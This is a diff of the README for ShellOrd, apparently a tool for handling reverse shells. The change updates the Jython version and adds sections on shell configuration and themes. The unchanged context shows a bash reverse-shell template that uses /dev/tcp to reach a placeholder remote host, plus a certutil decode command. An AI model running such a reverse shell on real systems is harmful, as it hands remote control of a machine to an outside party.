@@ -4,7 +4,7 @@
 
 ## Requirements
 
-- Python plugins requires Jython Standalone 2.7.2.
+- Python plugins requires Jython Standalone 2.7.3.
 - ShellOrd Server requires Java 17+.
 - Import Certificates in format PKCS12 (.p12) to enable SSL or HTTPS.
 
@@ -40,6 +40,20 @@ bash -c 'exec bash -i &>/dev/tcp/~[[rhost]]/~[[rport]] <&1'
 # powershell
 certutil -decode ~[[file_input]] ~[[file_output]]
 ```
+
+## Shell
+
+Includes commands to configure SHELLORD.
+
+![shellord-cmd-config](../_img/shellord-cmd-config.jpg)
+
+Note: Deprecated old mode
+
+## Themes
+
+Includes dark and light theme.
+
+![shellord-extensions](../_img/shellord-extensions.jpg)
 
 ### Example
 
